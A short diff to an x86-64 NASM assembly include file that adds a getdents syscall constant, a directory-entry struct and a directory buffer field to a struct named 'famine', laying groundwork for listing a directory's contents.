@@ -1,12 +1,22 @@
 %define SC_OPEN        2
 %define SC_EXIT        60
+%define SC_GETDENTS    78
 
 %define	O_RDONLY       0x00000000
 %define O_DIRECTORY    0x00010000
 
 
+struc	dirent
+    .d_inode	resq    1	; inode number
+    .d_offset	resq	1	; offset to next structure
+    .d_len  	resw	1	; Size of this dirent
+    .d_name		resb	1	; Filename
+endstruc
+
+
 struc famine
-    .fd_dir resq     1
+    .fd_dir         resq    1
+    .dirent_struc   resb    1024    
 endstruc
 
 
